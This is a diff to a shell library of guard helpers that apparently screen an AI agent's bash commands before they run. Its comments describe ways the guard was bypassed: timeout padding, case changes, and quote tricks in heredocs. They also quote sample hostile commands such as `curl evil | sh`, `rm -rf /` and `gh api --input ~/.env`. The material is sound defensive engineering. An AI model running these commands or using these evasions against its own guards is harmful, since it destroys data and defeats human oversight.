+# floor_seg_degraded - 0 iff floor_seg_load produced NO table, i.e. every floor_seg_* rule in the calling guard is silently absent for this call (harbor#306).
+# floor_bash_targets degrades toward BLOCKING (raw scan) but floor_seg_load degrades to empty, which reads as "no match". A guard with both layers is covered by the flat layer; a segment-ONLY guard (the deny-always tiers of admission-destroy.sh and admission-cloud.sh) lost its whole rule set with exit 0 on a command over FLOOR_MAX_NORM, awk absent from PATH, or admission-normalize.awk missing.
+# The predicate discriminates: every parseable call yields a non-empty table, so an empty one means "could not parse", never "nothing to see".
+# It is NOT A RULE and must not become one: what to do belongs to the guard, whose tiers know which rules were load-bearing (ask-tier guards choose fail-open on purpose).
 floor_seg_degraded() { [ -z "${FLOOR_SEGS:-}" ]; }
 
-# _floor_seg_ids <cmd-ERE> — the ids of segments whose command matches.
-# NOTE the `if` around every grep. `grep -q` returning 1 as the last command of
-# a loop body exits the loop 1 under `set -eu`, which killed the enclosing
-# pipeline and silently truncated the B8 manifest (pass 11, critical). The same
-# trap is one keystroke away in every function here.
-#
-# ONE grep over the whole SEGC block, not two processes PER SEGMENT. The first
-# cut looped over every segment and forked a sed and a grep for each, so with
-# five floor_seg_has calls in guard-bash a 60-line build script took 2.4s
-# against 0.23s before, and an 8KB payload took 38s (pass 12, P12-perf-04). That
-# is not a comfort issue: a PreToolUse hook that exceeds its timeout is SKIPPED,
-# so latency IS a fail-open bypass — padding the command switches the guard off.
+# _floor_seg_ids <cmd-ERE> - the ids of segments whose command matches.
+# NOTE the `if` around every grep: `grep -q` returning 1 as the last command of a loop body kills the enclosing pipeline under `set -eu` (it truncated the B8 manifest, pass 11); the trap is one keystroke away in every function here.
+# ONE grep over the whole SEGC block, not two processes PER SEGMENT (an 8KB payload took 38s, pass 12 P12-perf-04): latency is itself a fail-open bypass.
 _floor_seg_ids() { # <cmd-ERE> [ci]
-  # CASE-INSENSITIVITY IS OPT-IN, AND THE BLANKET FORM WAS MEASURED AND REJECTED
-  # (harbor#282). The whole flat layer is `-iEq`, so making this `-iE` too looks
-  # like the obvious repair for the CRONTAB bypass. It is not: this helper also
-  # resolves the shell segments floor_seg_shells_all_named_scripts counts, and one
-  # extra case-insensitive match withdraws the harbor#222 exemption.
-  #
-  # MEASURED over 2,000 real transcript commands: the blanket `-i` flipped exactly
-  # one verdict, ALLOW -> BLOCK as pipe-to-shell, and bisecting the payload to
-  # seven lines named the trigger — a heredoc commit message carrying
-  #
-  #     a hardcoded `WIRE_POST='Read|Bash|Grep|WebFetch'`
-  #
-  # The `|Bash` in that prose became a shell segment with no named script, the
-  # exemption failed, and a legitimate `sh <script> | grep` pipeline was refused.
-  # That is harbor#277's class, and this repo writes that matcher string into
-  # commit messages constantly — so 1-in-2,000 badly understates it for real work.
-  #
-  # So callers that mean "a command NAME, however spelled" ask for `ci`; callers
-  # that COUNT SHELLS must not, or the exemption they feed becomes unreliable.
+  # CASE-INSENSITIVITY IS OPT-IN (harbor#282): the blanket `-iE` was measured and rejected. This helper also resolves the shell segments floor_seg_shells_all_named_scripts counts, and one extra case-insensitive match (a heredoc commit message carrying `Read|Bash|Grep|WebFetch` made `|Bash` a shell segment) withdraws the harbor#222 exemption.
+  # Callers meaning "a command NAME, however spelled" ask for `ci`; callers that COUNT SHELLS must not.
   _fsci=""; [ "${2:-}" = ci ] && _fsci="-i"
   # The anchors come off by parameter expansion, not $(printf | sed): two fewer processes per call (harbor#264).
   _fsre="${1#^}"; _fsre="${_fsre%\$}"
@@ -1679,18 +1018,11 @@ $_fte"
   return 0
 }
 
-# floor_seg_has <cmd-ERE> [arg-ERE …] — exit 0 iff SOME ONE segment matches the
-# command AND carries an argument (or redirect target) for EVERY arg pattern.
-# "Some one" matters: the patterns must all hold of the SAME segment, which is
-# precisely what a flat scanner cannot express — `tar -tf a.tar; cp x ~/.claude`
-# satisfies both halves of the old regex across two unrelated commands.
+# floor_seg_has <cmd-ERE> [arg-ERE ...] - exit 0 iff SOME ONE segment matches the command AND carries an argument (or redirect target) for EVERY arg pattern. All patterns must hold of the SAME segment, which a flat scanner cannot express (`tar -tf a.tar; cp x ~/.claude`).
 floor_seg_has() {
   [ -n "${FLOOR_SEGS:-}" ] || return 1
   _scre="$1"; shift
-  # P13E-2: the per-segment loop below forked ~6 times per matching segment per call, so 2000 padded
-  # 'rm a' lines took the guard past the hook timeout, and a timed-out hook fails OPEN. The table path
-  # asks each arg pattern ONCE over every segment's arguments, with the same grep and the same pattern;
-  # the loop stays only as the fallback when that table cannot be built consistently.
+  # P13E-2: the per-segment loop forked ~6 times per matching segment, so padded input outran the hook timeout (which fails OPEN). The table path asks each arg pattern ONCE over every segment's arguments; the loop is the fallback when the table cannot be built consistently.
   if [ "$#" -gt 0 ] && _floor_seg_argtab; then
     _sids="$(_floor_seg_ids "$_scre" ci)"
     [ -n "$_sids" ] || return 1
@@ -1704,21 +1036,11 @@ floor_seg_has() {
     done
     return 0
   fi
-  # `ci` (harbor#282, PR #283 review). Every caller of this helper is asking "does
-  # some segment RUN this command", and on a case-insensitive filesystem GCLOUD is
-  # gcloud. Measured before widening: `gcloud projects delete` DENIED and `GCLOUD
-  # projects delete` ALLOWED; same for `bq rm`, `git reset --hard`, `git clean
-  # -fdx`, `diskutil eraseDisk` and `gh api --input ~/.env`. Those guards are
-  # argv-only by design — they emit permissionDecision rather than a flat block —
-  # so unlike guard-bash's rm/tar sites they had no case-insensitive twin to fall
-  # back on, and the gap was a complete bypass of an ask AND of two denies.
+  # `ci` (harbor#282): every caller asks "does some segment RUN this command", and on a case-insensitive filesystem GCLOUD is gcloud (`GCLOUD projects delete` was ALLOWED). These guards are argv-only, with no case-insensitive twin to fall back on.
   for _sid in $(_floor_seg_ids "$_scre" ci); do
     _sargs="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_sid}://p"
               printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGR:${_sid}:[^:]*://p")"
-    # Each token ALSO in its canonical-path spelling, so a rule needs only the
-    # absolute form and `~/.claude`, `$HOME/.claude` and `${HOME}/.claude` all
-    # reach it. sed is line-oriented and every token is its own line, so this
-    # cannot fuse two arguments into one.
+    # Each token ALSO in its canonical-path spelling, so a rule needs only the absolute form. Every token is its own line, so this cannot fuse two arguments.
     _sexp="$(floor_expand_paths "$_sargs")"
     if [ "$_sexp" != "$_sargs" ]; then _sargs="$_sargs
 $_sexp"; fi
@@ -1795,65 +1117,12 @@ _floor_hd_one_opener() {
     END { exit ((bad || !T) ? 1 : 0) }'
 }
 
-# floor_heredoc_inert_only (harbor#89) — 0 iff the WHOLE command is one INERT
-# command consuming a heredoc, and nothing else. Deliberately narrow.
-#
-# WHY IT EXISTS. Hours after the floor went live it blocked a `git commit` whose
-# MESSAGE quoted a destructive command as evidence the rule now catches it, then
-# blocked the issue filed about that, then blocked the attempt to inspect the
-# tokenizer. This repo's discipline is detailed records of what was blocked and
-# why, so the guard was taxing its own documentation.
-#
-# WHY NOT "IGNORE HEREDOC BODIES". A heredoc body is data to `git commit -F -`
-# and EXECUTABLE to `sh`. The tokenizer folds newlines to `;`, so the body
-# becomes its own segment with its own command word — measured:
-#   git commit -F - <<EOF / <destructive> / EOF
-#     SEGC:1:git  SEGR:1:<:EOF  SEGC:2:<verb>  SEGC:3:EOF
-#   sh <<EOF / <destructive> / EOF
-#     SEGC:1:sh   SEGR:1:<:EOF  SEGC:2:<verb>  SEGC:3:EOF
-# Identical but for the consumer, which is exactly the signal.
-#
-# WHY SO STRICT. The obvious predicate — "every segment's command word is
-# inert" — IS A BYPASS. `echo` is inert, so `echo x > <floor surface>` would
-# satisfy it and the floor-surface write would be waved through: the danger is
-# in the REDIRECT, not the command word. So this requires the command to be
-# EXACTLY one inert consumer, the body, and the delimiter as the LAST segment.
-# Anything after the delimiter — a second command, a redirect, an `&&` — and the
-# veto does not fire and the flat rules decide as they do today.
-#
-# FAIL-CLOSED: no table, no heredoc, or an unrecognised consumer ⇒ return 1.
-# The inert list is an ALLOWLIST. Enumerating dangerous words instead is what
-# let every prefix wrapper through the egress veto's first draft.
-#
-# ── --publisher-inert (harbor#125) · INERTNESS IS TWO QUESTIONS ─────────────
-# Both guards call this and they are not asking the same thing. guard-bash asks
-# "could this body be EXECUTED, or written to disk here"; guard-egress asks
-# "could this body LEAVE the box". `gh` answers NO to the first and emphatically
-# YES to the second, and one flat allowlist cannot say that — which is
-# harbor#90's diagnosis, reached again from the other side.
-#
-# The cost of the single list, measured 2026-08-22 against the installed floor:
-#     gh issue create --title t --body-file - <<EOF … EOF     BLOCKED
-#     git commit -F - <<EOF … EOF                            allowed
-# Same body. Filing an issue whose text quotes a blocked shape is blocked;
-# committing that text is not — the harbor#89 defect this function exists to
-# fix, surviving in the sibling verb. Four of one session's blocks landed on
-# documenting or measuring the floor rather than on any act against it.
-#
-# WHY THE SPLIT IS SAFE, and it rests on structure rather than on trust:
-# guard-egress does NOT pass this flag, keeps the strict list, and judges the
-# same command independently. `gh gist create - <<EOF <a credential path> EOF`
-# still blocks there — floor-test pins it as HEREDOC-1e, and that arm is what
-# caught an earlier attempt to add `gh` to the shared list. Handing the flag to
-# guard-egress turns it red, which is the mutation that proves the split is
-# load-bearing rather than cosmetic.
-#
-# THE SUBCOMMAND IS STILL CHECKED, because `gh` is not uniformly inert even for
-# execution: `gh alias set` stores a shell expansion that a later `gh <alias>`
-# runs — the deferred sink harbor#125 and #260 exist to close. The flag admits
-# `gh` only for text-consuming verbs, `alias` is excluded by OMISSION rather
-# than by a denylist, and an unrecognised verb falls through to today's
-# behaviour.
+# floor_heredoc_inert_only (harbor#89) - 0 iff the WHOLE command is one INERT command consuming a heredoc, and nothing else. Deliberately narrow.
+# WHY: a `git commit` whose message quoted a destructive command was blocked, and so was the issue filed about it; the guard was taxing its own documentation. WHY NOT "IGNORE HEREDOC BODIES": a body is data to `git commit -F -` and EXECUTABLE to `sh`; the tokenizer folds newlines to `;`, so the body becomes its own segment, and the two commands differ only by the consumer.
+# STRICT because "every segment's command word is inert" is a BYPASS (`echo x > <floor surface>`): the danger is in the REDIRECT. So: EXACTLY one inert consumer, the body, and the delimiter as the LAST segment. Anything after it and the flat rules decide as before.
+# FAIL-CLOSED: no table, no heredoc or an unrecognised consumer returns 1. The inert list is an ALLOWLIST.
+# --publisher-inert (harbor#125): inertness is two questions. guard-bash asks "could this body be EXECUTED or written here"; guard-egress asks "could it LEAVE the box". `gh` answers NO to the first and YES to the second, so one flat list cannot serve both (`gh issue create --body-file -` was blocked while `git commit -F -` was allowed). guard-egress does NOT pass the flag and keeps the strict list (floor-test HEREDOC-1e pins it; passing the flag there turns it red).
+# The subcommand is still checked: `gh alias set` stores a shell expansion that a later `gh <alias>` runs (harbor#125, #260). The flag admits `gh` only for text-consuming verbs, `alias` excluded by OMISSION, and an unrecognised verb falls through to the strict behaviour.
 floor_heredoc_inert_only() {
   [ -n "${FLOOR_SEGS:-}" ] && [ -n "${FLOOR_SEG_CMD:-}" ] || return 1
   case "$FLOOR_SEG_CMD" in *'<<'*) ;; *) return 1 ;; esac  # a builtin gate: no heredoc, no fork
@@ -1866,25 +1135,8 @@ floor_heredoc_inert_only() {
   case "${1:-}" in --publisher-inert) _hipub=1 ;; esac
   printf '%s\n' "$FLOOR_SEGS" | awk -v PUB="$_hipub" '
     BEGIN { split("echo printf git jq yq true false :", IV, " ") }
-    # A SYNTHESIZED SEGMENT IS NOT A POSITION IN THE COMMAND (P13-fs-06). The
-    # find -exec children admission-normalize.awk appends get ids ABOVE every parsed
-    # segment, so "the delimiter must be the LAST segment" started comparing the
-    # delimiter against a child that the heredoc body merely DESCRIBES. Measured:
-    # a git commit -F - heredoc whose BODY spells the find -exec shape went from
-    # exit 0 to exit 2 — a commit message documenting the shape this floor just
-    # learned to block, which is the harbor#92 false positive exactly (a rule
-    # taxing its own evidence).
-    # Skipped rather than renumbered: ordering is what the fold and the emitter
-    # depend on, and this predicate asks about the structure of the command.
-    # NO APOSTROPHES IN THIS BLOCK. The awk program is a single-quoted shell
-    # string, so one apostrophe inside a comment ENDS it and the rest of the
-    # program is re-parsed by the shell. Not a style rule: the first draft of
-    # this comment carried two, and the mangled program made this veto return 0 —
-    # exiting guard-bash at its line 58 for a command it had never judged.
-    # Measured both ways: floor-test.sh goes to 646 passed / 510 failed, so the
-    # suite does catch it, and lint stays at 43 rules / 0 violations, so the lint
-    # does not. A comment is the one place in this file where prose can break the
-    # program, and the reviewer who adds the next line here will not be told.
+    # A SYNTHESIZED SEGMENT IS NOT A POSITION IN THE COMMAND (P13-fs-06): find -exec children get ids above every parsed segment, so the delimiter-is-LAST test compared against a child the heredoc body merely describes (a false positive on a commit message documenting the shape). Skipped, not renumbered: the fold and the emitter depend on the ordering.
+    # NO APOSTROPHES IN THIS BLOCK: the awk program is a single-quoted shell string, so one apostrophe inside a comment ends it and the shell re-parses the rest (this veto then returned 0). A comment is the one place prose can break the program.
     /^SEGF:/ { s = $0; sub(/^SEGF:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
     # An eval body (harbor#786) is synthesized the same way, from a segment that
     # is itself a position: if that one follows the delimiter, the veto fails on it.
@@ -1898,17 +1150,7 @@ floor_heredoc_inert_only() {
       if (SYN[n + 0]) next
       C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0
     }
-    # Only a heredoc opened by the FIRST segment counts. A later one means the
-    # command did something before it, and that something is not covered here.
-    #
-    # `<<`, NOT `<` (pass 13, TOK-heredoc-inert-01 — critical). The tokenizer used
-    # to emit the same `SEGR:1:<:` row for a heredoc and for a plain input
-    # redirect, so this predicate matched `jq . < README ; rm -rf / ; README`:
-    # inert command word, a `<` redirect, and a last segment whose command word
-    # equals the target. Every clause was satisfied by an ORDINARY read, and the
-    # veto then exited guard-bash 0 with a "rm -rf /" sitting in the middle of the
-    # command. Measured at rc=0 — a total bypass of the guard, reached with no
-    # heredoc at all. admission-normalize.awk now distinguishes the two operators.
+    # Only a heredoc opened by the FIRST segment counts. `<<`, NOT `<` (pass 13, TOK-heredoc-inert-01, critical): the tokenizer once emitted the same SEGR row for a heredoc and a plain input redirect, so `jq . < README ; rm -rf / ; README` satisfied every clause and exited guard-bash 0. admission-normalize.awk now distinguishes the operators.
     /^SEGR:1:<<:/ { D = $0; sub(/^SEGR:1:<<:/, "", D) }
     /^SEGR:1:/ { R1++ }
     /^SEGW:1:/ { W1 = $0; sub(/^SEGW:1:/, "", W1) }
@@ -1934,10 +1176,7 @@ floor_heredoc_inert_only() {
         if (sc !~ /^(commit|tag|notes)$/) exit 1
       }
       if (w == "yq") for (q = 1; q <= AN; q++) if (A[q] ~ /^(-[a-zA-Z]*[is]|--inplace|--split-exp)/) exit 1
-      # A PUBLISHER IS INERT ONLY TO THE GUARD THAT DOES NOT JUDGE PUBLICATION,
-      # and only for a verb that consumes text. The first non-flag argument is
-      # the subcommand. NO APOSTROPHES IN THIS BLOCK: the awk program is a
-      # single-quoted shell string and one apostrophe ends it.
+      # A PUBLISHER IS INERT ONLY TO THE GUARD THAT DOES NOT JUDGE PUBLICATION, and only for a verb that consumes text (the first non-flag argument). NO APOSTROPHES IN THIS BLOCK.
       if (!ok && PUB == 1 && w == "gh") {
         split("issue pr release gist", PV, " ")
         for (q = 1; q <= AN; q++) {
@@ -1947,13 +1186,7 @@ floor_heredoc_inert_only() {
         }
       }
       if (!ok) exit 1
-      # NOTHING FOLLOWS THE HEREDOC — decided on the RAW command by _floor_hd_one_opener
-      # (harbor#803), not on the segment table. The old segment test "the last segment word
-      # is the delimiter" (C[MAX] == D) read the body as shell, so a lone apostrophe in a
-      # commit message opened a quote that swallowed the terminator, moved the last segment,
-      # and turned the veto OFF for a quoted-delimiter body — the harbor#805 false positive.
-      # _floor_hd_one_opener parses the body the way the shell does (quotes literal, terminator
-      # by line), so it is apostrophe-safe and strictly covers what C[MAX]==D was for.
+      # NOTHING FOLLOWS THE HEREDOC is decided on the RAW command by _floor_hd_one_opener (harbor#803), not on the segment table: the old last-segment-is-the-delimiter test read the body as shell, so a lone apostrophe in a commit message swallowed the terminator and turned the veto OFF (harbor#805).
       exit 0
     }'
 }
@@ -2098,24 +1331,8 @@ floor_hd_drop_doc_bodies() {
   if [ -n "$_hdbo" ]; then printf '%s' "$_hdbo"; else printf '%s' "$1"; fi
 }
 
-# floor_hd_unwrap_doc_bodies [--writers] <cmd> — like floor_hd_drop_doc_bodies, but
-# also drops the body of a document heredoc that sits behind ONE envelope
-# (harbor#782): a compound opener (`mkdir … && cat > f <<EOF`) or the
-# `<enclosing> … $(cat <<EOF)` argument form, which is how commits and PR bodies
-# are written here. Self-contained: it only PEELS the envelope off line 1 and then
-# delegates the delicate heredoc parsing to floor_hd_drop_doc_bodies, so both
-# consumer/interpreter safety and the leading case stay in one place. docs/explanation/admission-baseline.md has
-# the rule.
-#
-# WHY THE ENVELOPE IS SAFE TO PEEL. A compound prefix runs before the consumer and
-# never touches the body; the consumer that owns the heredoc is re-checked by the
-# delegate, so `x && bash <<EOF` is left judged. A `$(cat <<EOF)` prints the body
-# and its OUTPUT becomes an argument — harmless to a doc consumer or a
-# git/gh publish, executable to a shell — so the substitution arm peels ONLY when
-# the enclosing command word is on that allowlist, which is why `sh -c "$(…)"` and
-# `eval "$(…)"` are never peeled and keep blocking. A mis-split leaves an
-# unbalanced remainder the delegate refuses, so every ambiguous case fails toward
-# keeping the body judged.
+# floor_hd_unwrap_doc_bodies [--writers] <cmd> - like floor_hd_drop_doc_bodies, but also drops the body of a document heredoc behind ONE envelope (harbor#782): a compound opener (`mkdir ... && cat > f <<EOF`) or the `<enclosing> ... $(cat <<EOF)` argument form. It only PEELS the envelope off line 1 and delegates the heredoc parsing to floor_hd_drop_doc_bodies (admission-baseline.md has the rule).
+# Safe because a compound prefix never touches the body and the delegate re-checks the consumer (`x && bash <<EOF` stays judged). The `$(cat <<EOF)` arm peels ONLY when the enclosing command word is on the allowlist, so `sh -c "$(...)"` and `eval "$(...)"` keep blocking. A mis-split leaves an unbalanced remainder the delegate refuses.
 floor_hd_unwrap_doc_bodies() {
   _huw=0
   if [ "${1:-}" = --writers ]; then _huw=1; shift; fi
@@ -2272,16 +1489,8 @@ floor_hd_body_expands() {
     END { exit (hit ? 0 : 1) }'
 }
 
-# floor_hd_literalize_bodies <cmd> — <cmd> with every apostrophe and double quote INSIDE a
-# heredoc body replaced by a space (harbor#805). A heredoc body is not quote-parsed by the
-# shell, so those characters are literal there; but the normalizer reads the whole command as
-# one shell string with no heredoc awareness, so a lone `'` in a commit message opened a quote
-# that ran past the terminator and hid the body's own `$(…)` from extraction — measured:
-# `git commit -F - <<EOF` / `it's $(rm -rf ~)` / `EOF` reached exit 0 while the same body
-# without the apostrophe blocked. Command substitutions, backticks and `${`/`$[` are LEFT
-# intact, so an unquoted body that runs one is still judged; opener lines and everything
-# outside a body are untouched, so real syntax (`git commit -m "$(cat <<EOF`) is unchanged.
-# The veto reads the ORIGINAL (FLOOR_SEG_CMD), so delimiter quoting is detected as written.
+# floor_hd_literalize_bodies <cmd> - <cmd> with every apostrophe and double quote INSIDE a heredoc body replaced by a space (harbor#805). A body is literal to the shell, but the normalizer reads the whole command as one shell string, so a lone `'` in a commit message opened a quote past the terminator and hid the body's own `$(...)` (`it's $(rm -rf ~)` reached exit 0).
+# Substitutions, backticks and `${`/`$[` are LEFT intact, so an unquoted body that runs one is still judged; opener lines are untouched. The veto reads the ORIGINAL (FLOOR_SEG_CMD), so delimiter quoting is detected as written.
 floor_hd_literalize_bodies() {
   case "$1" in *'<<'*) ;; *) printf '%s' "$1"; return 0 ;; esac
   _hlb="$(printf '%s\n' "$1" | awk '
@@ -2331,9 +1540,7 @@ floor_hd_literalize_bodies() {
           y = L[i]; gsub(/[\047"]/, " ", y)   # a body line: quotes are literal here
           out = out sep y; sep = "\n"; i++; continue
         }
-        # A command/opener line. If its quotes do not balance here (the logical line continues
-        # onto the next physical line, e.g. an open quote past a heredoc opener — harbor#784),
-        # body boundaries are ambiguous, so leave the WHOLE command untouched.
+        # A command/opener line. If its quotes do not balance (harbor#784) body boundaries are ambiguous, so leave the WHOLE command untouched.
         before = NQ; bal = scan(L[i])
         if (bal != 1) { print_original(); exit }
         out = out sep L[i]; sep = "\n"; i++
@@ -2419,55 +1626,11 @@ $_suwadd"
   return 0
 }
 
-# floor_seg_flagval <cmd-ERE> <flag-name-ERE> <value-ERE> — exit 0 iff SOME
-# segment runs a matching command AND carries that flag with an adjacent VALUE
-# matching <value-ERE>, in either spelling: `--flag value` or `--flag=value`.
-#
-# WHY ADJACENCY NEEDS ITS OWN HELPER. floor_seg_has asks only whether a token is
-# PRESENT in a segment, which is the right question for a verb or a switch and
-# the wrong one for a flag whose meaning is carried by the number after it. The
-# case that forced it (harbor#194, Codex review of PR #209): `bq update
-# --expiration 0` does not arm a deletion timer, it REMOVES one — bq's own help
-# says "Specifying 0 removes expiration time" — so a presence test asks the
-# operator to confirm, and hard-denies a subagent, at the exact moment someone is
-# preventing future data loss. §2.11, pointed the wrong way round.
-#
-# THE `=` SPELLING IS THE SAME QUESTION. absl-flags accepts `--expiration=3600`,
-# and a rule anchored on the bare token matched neither the value nor the flag.
-# The name is split off here so one ERE serves both spellings.
-#
-# BOTH DIRECTIONS OF USE NOW EXIST, and they fail opposite ways — read this
-# before adding a third caller.
-#   • guard-cloud EXEMPTS with it: "the flag is present AND its value is not the
-#     clearing one". An unrecognised or expanded value (`--expiration $SECS`)
-#     yields no match, the exemption is withheld, and the command stays
-#     destructive-by-default. Fails SAFE.
-#   • guard-bash FIRES on it (harbor#196): "an output-destination flag whose
-#     value is a floor surface". There an unrecognised value yields no match and
-#     the command is ALLOWED. Fails OPEN — which is the direction every scanner
-#     in this file takes, and the reason B1's permissions.deny sits underneath
-#     needing no parser at all.
-#
-# THE VALUE IS TESTED IN BOTH SPELLINGS — the raw token and its canonical path
-# form — so a path rule needs only the absolute form and `~/.claude`,
-# `$HOME/.claude` and `${HOME}/.claude` all reach it. Without that, harbor#196's
-# rule matched `-o /Users/me/.claude/bin/admission-bash.sh` and missed the `~/`
-# spelling every human actually types, which is a bypass wearing a fix's badge.
-#
-# ONE awk PASS OVER THE WHOLE TABLE, NOT ONE PER SEGMENT. The first cut of the
-# harbor#196 caller passes `.*` as the command ERE — it is verb-agnostic by
-# design — so the per-segment loop this helper used to run forked a sed and an
-# awk for EVERY segment. P12-perf-04 caught it immediately: its 2000-segment
-# payload went from 0.26s to 5s, past the 3s bound, and a PreToolUse hook that
-# exceeds its timeout is SKIPPED. Latency here is not a comfort issue, it is a
-# fail-open bypass — padding a command would switch the guard off. Same lesson as
-# _floor_seg_ids' own comment, re-learned one helper along.
-#
-# THE EXPANSION IS LAZY for the same reason. floor_expand_paths costs two more
-# forks, so the pass reports THREE outcomes — matched; no such flag anywhere; or
-# `the flag is present in these segments but no value matched in the RAW
-# spelling` — and only the third is worth canonicalising and re-scanning. That
-# case is rare: almost every command in a session carries no matching flag at all.
+# floor_seg_flagval <cmd-ERE> <flag-name-ERE> <value-ERE> - exit 0 iff SOME segment runs a matching command AND carries that flag with an adjacent VALUE matching <value-ERE>, as `--flag value` or `--flag=value`.
+# Adjacency needs its own helper: floor_seg_has asks whether a token is PRESENT, wrong for a flag whose meaning is the value after it (harbor#194: `bq update --expiration 0` REMOVES a timer, so a presence test asked for confirmation at the moment someone prevents data loss). absl-flags also accepts `--expiration=3600`; the name is split off so one ERE serves both.
+# TWO DIRECTIONS OF USE, failing opposite ways; read this before adding a third caller. guard-cloud EXEMPTS with it (flag present AND value not the clearing one): an unrecognised or expanded value gives no match, the exemption is withheld, fails SAFE. guard-bash FIRES on it (harbor#196, an output flag whose value is a floor surface): an unrecognised value gives no match and the command is ALLOWED, fails OPEN, the direction every scanner here takes, with B1's permissions.deny underneath.
+# The value is tested in BOTH spellings, raw and canonical path, so `~/.claude` and `$HOME/.claude` reach a rule written for the absolute form.
+# ONE awk PASS OVER THE WHOLE TABLE, not one per segment (harbor#196's caller passes `.*`; 2000 segments went from 0.26s to 5s, P12-perf-04; latency is a fail-open bypass). The expansion is LAZY for the same reason: the pass reports matched; no such flag anywhere; or flag present but no raw match, and only the third is canonicalised and re-scanned.
 # --short (harbor#788): a single-dash token is also read as getopt reads a bundle.
 # The first letter whose `-<letter>` matches takes the rest of the token as its
 # value, or the next token when it is last: `-so <v>`, `-sSLo <v>`, `-o<v>`.
@@ -2556,39 +1719,12 @@ floor_seg_redir() {
   return 1
 }
 
-# floor_seg_shells_all_named_scripts — exit 0 iff the table is loaded AND every
-# segment running a shell interpreter carries a SCRIPT FILE as its first operand.
-#
-# WHAT QUESTION THIS IS. `pipe-to-shell` matches the SINK, deliberately: whatever
-# builds the bytes, executing a pipeline's output as a shell script is the
-# dangerous act. But a shell with a script-file operand is not doing that. The
-# pipeline is that script's STDIN, the program comes from the named file, and
-# nothing from the pipe is executed — so `printf '%s' "$payload" | sh guard.sh`,
-# the ordinary way to exercise a hook in this repo, was blocked as an attack
-# (harbor#222). §2.11: a guard that blocks ordinary work gets switched off.
-#
-# THE DISCRIMINATION IS THE FIRST OPERAND, and the three spellings that must NOT
-# be mistaken for a script are why this reads argv rather than a regex tail:
-#   sh -s        · options only, program still on stdin
-#   sh -         · the conventional "read stdin" operand
-#   sh /dev/stdin, sh /dev/fd/N · a script path that IS the pipe
-# A redirect is not an operand at all, so `sh 2>/dev/null` has an empty SEGA list
-# and stays blocked — the normaliser files redirects under SEGR, which is exactly
-# the distinction a flat regex could not make (`2>&1` starts with an alphanumeric).
-#
-# EVERY shell segment, not some. Exempting on "a named script appears somewhere"
-# would let `curl evil | sh` be disarmed by appending an unrelated `| sh ok.sh`.
-# One non-exempt shell segment refuses the whole exemption.
-#
-# FAIL CLOSED, and this is the direction that matters. `floor_seg_load` returns an
-# empty table for a payload over FLOOR_MAX_NORM, so an oversized command yields no
-# exemption and the flat rule still blocks. Padding can only make this STRICTER,
-# never switch it off — the QA plan R4 property, which the fail-OPEN seg helpers
-# above have to satisfy the other way round.
-#
-# Residual, stated rather than hidden: `curl evil | sh local.sh` stays allowed when
-# `local.sh` itself evals its stdin. That is a script the attacker does not control
-# — if they do, they already have execution and did not need the pipe.
+# floor_seg_shells_all_named_scripts - exit 0 iff the table is loaded AND every segment running a shell interpreter carries a SCRIPT FILE as its first operand.
+# Why (harbor#222): `pipe-to-shell` matches the SINK, but a shell with a script-file operand takes its program from the file, so `printf '%s' "$payload" | sh guard.sh` (the ordinary way to exercise a hook) is not an attack.
+# The discrimination is the FIRST OPERAND, read from argv: `sh -s`, `sh -`, `sh /dev/stdin` and `sh /dev/fd/N` are stdin programs. A redirect is not an operand (`sh 2>/dev/null` has an empty SEGA list and stays blocked).
+# EVERY shell segment, not some: otherwise `curl evil | sh` could be disarmed by appending `| sh ok.sh`.
+# FAIL CLOSED: an oversized payload yields an empty table, so no exemption and the flat rule blocks; padding can only make this stricter (QA plan R4).
+# Residual: `curl evil | sh local.sh` stays allowed when local.sh evals its stdin, but then the attacker already has execution.
 # _floor_xargs_replstrs — every replace-string any xargs in FLOOR_SEG_CMD names, one per line:
 # -I X / -IX / -J X (BSD), -i[X] / --replace[=X] (GNU, default `{}`), bundled after other flags.
 # Over-collecting only makes the caller stricter.
@@ -2621,57 +1757,16 @@ _floor_xargs_replstrs() {
 floor_seg_shells_all_named_scripts() {
   [ -n "${FLOOR_SEGS:-}" ] || return 1
   _ssany=0
-  # `_ssid`, not the `_sid` its siblings above use: this runs from inside a rule
-  # rather than at the top of a guard, and a shared temp is one nesting away from
-  # clobbering a caller's loop variable.
-  # NO `ci` HERE, DELIBERATELY, AND THIS IS THE ONE PLACE IT MATTERS. Every other
-  # segment helper folds case (harbor#282); this one COUNTS SHELLS to decide
-  # whether the harbor#222 named-script exemption applies, and folding case makes
-  # it over-count. Measured: with a blanket -i, the word `Bash` inside a heredoc
-  # commit message — `a hardcoded WIRE_POST='Read|Bash|Grep|WebFetch'` — became a
-  # shell segment with no named script, the exemption failed, and a legitimate
-  # `sh <script> | grep` pipeline was refused. One flip in 2,000 real transcript
-  # commands, on this repo's daily commit-message idiom.
+  # `_ssid`, not `_sid`: this runs inside a rule, and a shared temp could clobber a caller's loop variable.
+  # NO `ci` HERE, DELIBERATELY: every other segment helper folds case (harbor#282), but this one COUNTS SHELLS for the harbor#222 exemption and folding case over-counts (the word `Bash` in a heredoc commit message became a shell segment and refused a legitimate `sh <script> | grep`).
   for _ssid in $(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(sh|bash|zsh|dash|ksh|fish|ash|csh|tcsh)'); do
     # FIRST operand only: `bash script.sh --json` is a script run, `bash -s -- x`
     # is not, and only the leading token separates them.
     _ssarg="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | head -1)"
-    # A `-c` PARENT IS NOT A SHELL RUN, IT IS THE ENVELOPE OF ONE (edge pass
-    # 2026-08-29). seg_expand_interpreters re-tokenizes a `-c` payload into child
-    # segments, so the shells that actually run appear on their own; the parent
-    # is left holding the flag. Counting it disqualified the exemption for
-    # `sh -c 'printf x | sh <named script>'` — piping a payload into a named hook
-    # script, which is how every hook in this repo is tested, and which is
-    # ALLOWED the moment the `sh -c` wrapper is removed. It blocked three tool
-    # calls in the pass that found it.
-    #
-    # SKIPPING IT CANNOT OPEN THE DANGEROUS CASE, because the children answer for
-    # themselves: `sh -c 'curl … | sh'` expands to a `curl` segment and a bare
-    # `sh` segment with NO operand, and the `[ -n "$_ssarg" ]` arm below still
-    # refuses that one. Nor can it open the un-expanded case: if expansion did
-    # not happen there are no children, `_ssany` stays 0, and the tail of this
-    # function already treats "no shell segment I could check" as no exemption.
